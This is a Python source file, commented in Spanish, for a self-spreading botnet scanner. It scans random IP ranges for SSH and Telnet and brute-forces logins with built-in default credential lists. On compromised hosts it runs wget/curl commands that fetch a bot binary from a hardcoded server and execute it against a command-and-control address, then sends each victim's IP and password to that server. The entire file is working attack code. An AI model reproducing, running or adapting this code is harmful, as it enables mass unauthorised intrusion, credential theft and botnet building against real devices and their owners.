import socket
import time
import random
import threading
import select
import sys
import struct
import subprocess
import ipaddress
import paramiko
import telnetlib
import queue
import os
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

# CONFIG
CNC_IP = "172.96.140.62"
CNC_PORT = 14037
CNC_BOT_PORT = 14037
USER = "rockyy"
PASS = "rockyy123"

# BOT URLs - ACTUALIZA CON TU SERVIDOR REAL
BOT_URLS = {
    "default": "http://172.96.140.62:11202/bot/x86",
    "x86_64": "http://172.96.140.62:11202/bot/x86_64",
    "x86": "http://172.96.140.62:11202/bot/x86",
    "arm": "http://172.96.140.62:11202/bot/arm",
    "arm5": "http://172.96.140.62:11202/bot/arm5",
    "arm6": "http://172.96.140.62:11202/bot/arm6",
    "arm7": "http://172.96.140.62:11202/bot/arm7",
    "mips": "http://172.96.140.62:11202/bot/mips",
    "mipsel": "http://172.96.140.62:11202/bot/mipsel",
    "aarch64": "http://172.96.140.62:11202/bot/aarch64"
}

# CREDENCIALES MASIVAS OPTIMIZADAS
SSH_CREDENTIALS = [
    # TOP 20 - Más comunes primero
    ("root", "root"),
    ("admin", "admin"),
    ("root", ""),
    ("admin", ""),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", "1234"),
    ("admin", "1234"),
    ("root", "toor"),
    ("root", "admin"),
    ("admin", "admin123"),
    ("root", "12345"),
    ("admin", "12345"),
    ("root", "12345678"),
    ("admin", "12345678"),
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("user", "user"),
    ("test", "test"),
    ("guest", "guest"),
    ("support", "support"),
    ("service", "service"),
    ("operator", "operator"),
]

TELNET_CREDENTIALS = [
    ("root", ""),
    ("admin", ""),
    ("root", "root"),
    ("admin", "admin"),
    ("", ""),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", "1234"),
    ("admin", "1234"),
    ("root", "toor"),
    ("admin", "admin123"),
    ("user", "user"),
    ("guest", "guest"),
    ("support", "support"),
    ("service", "service"),
    ("operator", "operator"),
    ("D-Link", ""),
    ("debug", "debug"),
]

class RobustSSHClient:
    """Cliente SSH con manejo robusto de errores"""
    
    @staticmethod
    def connect_with_retry(ip, port, username, password, timeout=6, retries=1):
        """Conectar SSH con manejo de errores"""
        ssh = None
        for attempt in range(retries + 1):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Configuración para evitar timeout de banner
                transport = ssh.get_transport() if ssh.get_transport() else None
                if transport:
                    transport.window_size = 2147483647
                    transport.packetizer.REKEY_BYTES = pow(2, 40)
                    transport.packetizer.REKEY_PACKETS = pow(2, 40)
                
                ssh.connect(
                    hostname=ip,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    banner_timeout=10,
                    auth_timeout=10,
                    look_for_keys=False,
                    allow_agent=False,
                    compress=True
                )
                return ssh
                
            except paramiko.AuthenticationException:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
                return None
            except paramiko.SSHException as e:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
                if "Error reading SSH protocol banner" in str(e):
                    # Reintentar con configuración diferente
                    time.sleep(0.5)
                    continue
                return None
            except socket.timeout:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
                return None
            except Exception as e:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
                return None
        
        return None
    
    @staticmethod
    def test_ssh_access(ip, port, username, password, timeout=4):
        """Probar acceso SSH de forma rápida y segura"""
        ssh = RobustSSHClient.connect_with_retry(ip, port, username, password, timeout)
        
        if ssh:
            try:
                # Comando simple para verificar acceso
                stdin, stdout, stderr = ssh.exec_command("echo OK", timeout=2)
                output = stdout.read().decode('utf-8', errors='ignore').strip()
                
                if output == "OK":
                    # Intentar detectar arquitectura
                    arch = RobustSSHClient.detect_architecture(ssh)
                    ssh.close()
                    return True, arch
                
                ssh.close()
            except:
                try:
                    ssh.close()
                except:
                    pass
            
        return False, "unknown"
    
    @staticmethod
    def detect_architecture(ssh_client):
        """Detectar arquitectura del sistema"""
        try:
            stdin, stdout, stderr = ssh_client.exec_command("uname -m", timeout=2)
            arch_output = stdout.read().decode('utf-8', errors='ignore').lower()
            
            if "x86_64" in arch_output or "amd64" in arch_output:
                return "x86_64"
            elif "i386" in arch_output or "i686" in arch_output:
                return "x86"
            elif "arm" in arch_output:
                if "armv5" in arch_output:
                    return "arm5"
                elif "armv6" in arch_output:
                    return "arm6"
                elif "armv7" in arch_output:
                    return "arm7"
                elif "armv8" in arch_output:
                    return "arm8"
                else:
                    return "arm"
            elif "mips" in arch_output:
                if "mipsel" in arch_output:
                    return "mipsel"
                else:
                    return "mips"
            elif "aarch64" in arch_output:
                return "aarch64"
            else:
                return "unknown"
        except:
            return "unknown"

class RobustTelnetClient:
    """Cliente Telnet con manejo robusto de errores"""
    
    @staticmethod
    def connect_with_retry(ip, port, username, password, timeout=5):
        """Conectar Telnet con manejo de errores"""
        try:
            tn = telnetlib.Telnet(ip, port, timeout=timeout)
            
            # Esperar prompt de login
            try:
                index, match, text = tn.expect([b'[Ll]ogin:', b'[Uu]sername:', b'#', b'\$', b'>'], timeout=3)
            except:
                index = -1
            
            # Si necesita login
            if index in [0, 1]:
                tn.write(username.encode() + b"\r\n")
                time.sleep(0.3)
                
                # Buscar prompt de password
                try:
                    tn.expect([b'[Pp]assword:'], timeout=2)
                    tn.write(password.encode() + b"\r\n")
                    time.sleep(0.5)
                except:
                    pass
            
            # Enviar comando de prueba
            tn.write(b"\r\n")
            time.sleep(0.5)
            tn.write(b"echo OK\r\n")
            time.sleep(0.5)
            
            # Leer respuesta
            output = tn.read_very_eager().decode('ascii', errors='ignore')
            
            if "OK" in output or "#" in output or "$" in output or ">" in output:
                # Detectar arquitectura
                arch = RobustTelnetClient.detect_architecture(tn)
                return tn, arch
            
            tn.close()
            return None, "unknown"
            
        except Exception as e:
            return None, "unknown"
    
    @staticmethod
    def detect_architecture(tn_client):
        """Detectar arquitectura via Telnet"""
        try:
            tn_client.write(b"uname -m\r\n")
            time.sleep(0.5)
            output = tn_client.read_very_eager().decode('ascii', errors='ignore').lower()
            
            if "x86_64" in output or "amd64" in output:
                return "x86_64"
            elif "i386" in output or "i686" in output:
                return "x86"
            elif "arm" in output:
                if "armv5" in output:
                    return "arm5"
                elif "armv6" in output:
                    return "arm6"
                elif "armv7" in output:
                    return "arm7"
                elif "armv8" in output:
                    return "arm8"
                else:
                    return "arm"
            elif "mips" in output:
                if "mipsel" in output:
                    return "mipsel"
                else:
                    return "mips"
            elif "aarch64" in output:
                return "aarch64"
            else:
                return "unknown"
        except:
            return "unknown"

class CNCReporter:
    """Reportador a CNC con reconexión automática"""
    
    def __init__(self):
        self.cnc_ip = CNC_IP
        self.cnc_port = CNC_PORT
        self.queue = queue.Queue(maxsize=5000)
        self.running = True
        self.worker_thread = None
        
    def start(self):
        """Iniciar worker de reportes"""
        self.running = True
        self.worker_thread = threading.Thread(target=self._report_worker, daemon=True)
        self.worker_thread.start()
        print(f"[CNC] Reportador iniciado para {self.cnc_ip}:{self.cnc_port}")
    
    def stop(self):
        """Detener reportador"""
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=2)
    
    def report_infection(self, ip, port, service, username, password, arch):
        """Agregar reporte a la cola"""
        try:
            report = {
                'ip': ip,
                'port': port,
                'service': service,
                'username': username,
                'password': password,
                'arch': arch,
                'timestamp': time.time()
            }
            self.queue.put_nowait(report)
            return True
        except:
            return False
    
    def _report_worker(self):
        """Worker que envía reportes a CNC"""
        while self.running:
            try:
                # Procesar batch de reportes
                reports = []
                try:
                    while len(reports) < 10 and not self.queue.empty():
                        report = self.queue.get_nowait()
                        reports.append(report)
                        self.queue.task_done()
                except:
                    pass
                
                if reports:
                    self._send_batch_to_cnc(reports)
                
                time.sleep(1)
                
            except Exception as e:
                time.sleep(5)
    
    def _send_batch_to_cnc(self, reports):
        """Enviar batch de reportes a CNC"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.cnc_ip, self.cnc_port))
            
            for report in reports:
                report_msg = f"INFECT|{report['ip']}|{report['port']}|{report['service']}|{report['username']}:{report['password']}|{report['arch']}|{USER}\n"
                sock.sendall(report_msg.encode())
                time.sleep(0.01)
            
            sock.close()
            print(f"[CNC] Reportados {len(reports)} dispositivos")
            
        except Exception as e:
            print(f"[CNC] Error enviando reportes: {e}")
            # Re-encolar reportes fallidos
            for report in reports:
                try:
                    self.queue.put_nowait(report)
                except:
                    pass

class BotDeployer:
    """Sistema de deploy de bots robusto"""
    
    def __init__(self):
        self.cnc_reporter = CNCReporter()
        self.cnc_reporter.start()
    
    def deploy_ssh_bot(self, ip, port, username, password, arch):
        """Desplegar bot via SSH"""
        try:
            ssh = RobustSSHClient.connect_with_retry(ip, port, username, password, timeout=8)
            
            if not ssh:
                return False
            
            # Obtener URL del bot
            arch_key = arch if arch in BOT_URLS else "default"
            bot_url = BOT_URLS.get(arch_key, BOT_URLS["default"])
            
            # Comandos simplificados
            deploy_commands = [
                "cd /tmp || cd /var/tmp",
                f"wget {bot_url} -O .bot 2>/dev/null || curl {bot_url} -o .bot 2>/dev/null || busybox wget {bot_url} -O .bot",
                "chmod +x .bot",
                f"nohup ./.bot {CNC_IP} {CNC_BOT_PORT} >/dev/null 2>&1 &",
                "sleep 1"
            ]
            
            for cmd in deploy_commands:
                try:
                    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=5)
                    stdout.read()  # Consumir output
                    time.sleep(0.3)
                except:
                    continue
            
            # Verificar
            stdin, stdout, stderr = ssh.exec_command("ps aux | grep .bot | grep -v grep", timeout=3)
            output = stdout.read().decode('utf-8', errors='ignore')
            
            ssh.close()
            
            if '.bot' in output:
                # Reportar éxito
                self.cnc_reporter.report_infection(ip, port, "ssh", username, password, arch)
                return True
            
        except Exception as e:
            pass
        
        return False
    
    def deploy_telnet_bot(self, ip, port, username, password, arch):
        """Desplegar bot via Telnet"""
        try:
            tn, detected_arch = RobustTelnetClient.connect_with_retry(ip, port, username, password, timeout=8)
            
            if not tn:
                return False
            
            # Usar arquitectura detectada
            if detected_arch != "unknown":
                arch = detected_arch
            
            # Obtener URL del bot
            arch_key = arch if arch in BOT_URLS else "default"
            bot_url = BOT_URLS.get(arch_key, BOT_URLS["default"])
            
            # Comandos simplificados
            deploy_commands = [
                "cd /tmp",
                f"wget {bot_url} -O .bot",
                f"curl {bot_url} -o .bot",
                "chmod +x .bot",
                f"./.bot {CNC_IP} {CNC_BOT_PORT} &",
                "exit"
            ]
            
            for cmd in deploy_commands:
                try:
                    tn.write(cmd.encode() + b"\r\n")
                    time.sleep(0.5)
                except:
                    break
            
            tn.close()
            
            # Reportar éxito (asumimos que funcionó)
            self.cnc_reporter.report_infection(ip, port, "telnet", username, password, arch)
            return True
            
        except Exception as e:
            pass
        
        return False

class FastPortScanner:
    """Escáner de puertos rápido y eficiente"""
    
    def __init__(self):
        self.timeout = 0.8
        self.batch_size = 100
    
    def scan_port(self, ip, port):
        """Escaneo de puerto individual"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_batch(self, ip_list, port):
        """Escaneo de batch de IPs"""
        results = []
        for ip in ip_list:
            if self.scan_port(ip, port):
                results.append(ip)
        return results

class TargetScanner:
    """Escáner principal optimizado"""
    
    def __init__(self):
        self.running = True
        self.lock = threading.Lock()
        self.scan_queue = queue.Queue()
        self.port_scanner = FastPortScanner()
        self.bot_deployer = BotDeployer()
        
        # Estadísticas
        self.stats = {
            'scanned': 0,
            'open_ports': 0,
            'successful_logins': 0,
            'bots_deployed': 0,
            'start_time': time.time()
        }
        
        # Puertos a escanear
        self.target_ports = {
            22: 'ssh',
            23: 'telnet',
            2222: 'ssh',
            2223: 'ssh',
            22222: 'ssh'
        }
    
    def stop(self):
        """Detener escáner"""
        with self.lock:
            self.running = False
        print("[!] Escáner detenido")
    
    def generate_ips(self, count=10000):
        """Generar IPs aleatorias"""
        ips = []
        for _ in range(count):
            # Mezclar rangos
            if random.random() < 0.6:  # 60% públicas
                octet1 = random.choice([1, 2, 3, 4, 5, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18])
                ip = f"{octet1}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            else:  # 40% privadas
                if random.random() < 0.5:
                    ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
                else:
                    ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ips.append(ip)
        return ips
    
    def brute_service(self, ip, port, service_type):
        """Bruteforce de servicio"""
        if service_type == 'ssh':
            cred_list = SSH_CREDENTIALS[:15]  # Solo 15 intentos
        else:
            cred_list = TELNET_CREDENTIALS[:15]
        
        for username, password in cred_list:
            if not self.running:
                return None
            
            try:
                if service_type == 'ssh':
                    success, arch = RobustSSHClient.test_ssh_access(ip, port, username, password)
                else:
                    tn, arch = RobustTelnetClient.connect_with_retry(ip, port, username, password)
                    success = tn is not None
                    if tn:
                        tn.close()
                
                if success:
                    print(f"[+] {service_type.upper()} VULN: {ip}:{port} | {username}:{password}")
                    
                    # Deploy bot
                    if service_type == 'ssh':
                        deployed = self.bot_deployer.deploy_ssh_bot(ip, port, username, password, arch)
                    else:
                        deployed = self.bot_deployer.deploy_telnet_bot(ip, port, username, password, arch)
                    
                    with self.lock:
                        self.stats['successful_logins'] += 1
                        if deployed:
                            self.stats['bots_deployed'] += 1
                    
                    return True
            
            except Exception as e:
                continue
        
        return False
    
    def scan_worker(self):
        """Worker de escaneo"""
        while self.running:
            try:
                ip = self.scan_queue.get(timeout=1)
                
                # Escanear puertos importantes
                for port, service_type in self.target_ports.items():
                    if not self.running:
                        break
                    
                    # Escanear puerto
                    if self.port_scanner.scan_port(ip, port):
                        with self.lock:
                            self.stats['open_ports'] += 1
                        
                        # Bruteforce
                        self.brute_service(ip, port, service_type)
                
                with self.lock:
                    self.stats['scanned'] += 1
                
                self.scan_queue.task_done()
                
                # Reporte periódico
                if self.stats['scanned'] % 100 == 0:
                    self.print_stats()
                    
            except queue.Empty:
                continue
            except Exception as e:
                continue
    
    def print_stats(self):
        """Mostrar estadísticas"""
        elapsed = time.time() - self.stats['start_time']
        with self.lock:
            scanned = self.stats['scanned']
            open_ports = self.stats['open_ports']
            logins = self.stats['successful_logins']
            bots = self.stats['bots_deployed']
        
        if elapsed > 0:
            rate = scanned / elapsed
            
            print(f"\n{'='*50}")
            print(f"[📊] ESTADÍSTICAS - {elapsed:.0f}s")
            print(f"[⚡] Velocidad: {rate:.1f} IPs/seg")
            print(f"[🔍] Escaneadas: {scanned}")
            print(f"[🎯] Puertos abiertos: {open_ports}")
            print(f"[🔑] Logins exitosos: {logins}")
            print(f"[🤖] Bots desplegados: {bots}")
            print(f"[🌐] CNC: {CNC_IP}:{CNC_PORT}")
            print(f"{'='*50}\n")
    
    def start_scan(self, target_count=50000):
        """Iniciar escaneo"""
        print(f"[🚀] Iniciando escaneo de {target_count} IPs")
        print(f"[🌐] Conectando a CNC: {CNC_IP}:{CNC_PORT}")
        
        # Generar IPs iniciales
        ips = self.generate_ips(target_count)
        for ip in ips:
            self.scan_queue.put(ip)
        
        # Iniciar workers
        workers = []
        for i in range(50):  # 50 workers
            t = threading.Thread(target=self.scan_worker, daemon=True)
            t.start()
            workers.append(t)
        
        print(f"[✅] {len(workers)} workers activos")
        
        # Loop principal
        cycle = 0
        while self.running:
            time.sleep(10)
            cycle += 1
            
            # Reponer IPs si es necesario
            if self.scan_queue.qsize() < 1000:
                new_ips = self.generate_ips(10000)
                for ip in new_ips:
                    if self.running:
                        self.scan_queue.put(ip)
                print(f"[🔄] Ciclo {cycle}: +10K IPs")
            
            # Mostrar stats
            self.print_stats()
        
        print("[!] Escaneo completado")

def main():
    """Función principal"""
    scanner = TargetScanner()
    
    print("""
    ╔══════════════════════════════════════════╗
    ║        SCANNER ROBUSTO v2.0              ║
    ║    ==============================        ║
    ║    ✅ SSH/Telnet con manejo de errores   ║
    ║    ✅ Auto-deploy de bots                ║
    ║    ✅ Reporte automático a CNC           ║
    ║    ✅ 14037 - Puerto único               ║
    ║    ==============================        ║
    ╚══════════════════════════════════════════╝
    """)
    
    try:
        # Iniciar escaneo automáticamente
        print("\n[🚀] Iniciando escaneo automático...")
        
        scan_thread = threading.Thread(target=scanner.start_scan, args=(100000,), daemon=True)
        scan_thread.start()
        
        print("[✅] Escáner activo. Ctrl+C para detener.")
        print("[📡] Estadísticas cada 10 segundos...\n")
        
        # Mantener programa activo
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Deteniendo escáner...")
        scanner.stop()
        time.sleep(2)
        print("[✅] Escáner detenido correctamente")
    except Exception as e:
        print(f"[!] Error: {e}")
        scanner.stop()

if __name__ == "__main__":
    # Configuración simple
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Programa finalizado")
    except Exception as e:
        print(f"[!] Error fatal: {e}")
